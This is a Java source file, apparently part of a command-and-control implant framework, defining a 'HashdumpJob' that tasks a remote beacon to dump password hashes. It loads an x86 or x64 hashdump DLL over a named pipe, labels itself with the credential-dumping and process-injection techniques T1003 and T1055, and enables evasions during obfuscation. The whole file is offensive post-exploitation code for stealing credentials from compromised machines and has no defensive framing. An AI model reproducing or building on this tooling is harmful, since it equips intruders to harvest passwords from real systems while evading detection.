package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import pe.PostExObfuscator;

public class HashdumpJob extends Job {
    public HashdumpJob(TaskBeacon taskBeacon) {
        super(taskBeacon);
    }

    public String getDescription() {
        return "Tasked beacon to dump hashes";
    }

    public String getShortDescription() {
        return "dump password hashes";
    }

    public String getDLLName() {
        return this.arch.equals("x64") ? "resources/hashdump.x64.dll" : "resources/hashdump.dll";
    }

    public String getPipeName() {
        return "hashdump";
    }

    public String getTactic() {
        return "T1003, T1055";
    }

    public int getCallbackType() {
        return 21;
    }

    public int getWaitTime() {
        return 15000;
    }

    public void obfuscate(PostExObfuscator postExObfuscator, byte[] arrby) {
        postExObfuscator.enableEvasions();
    }
}
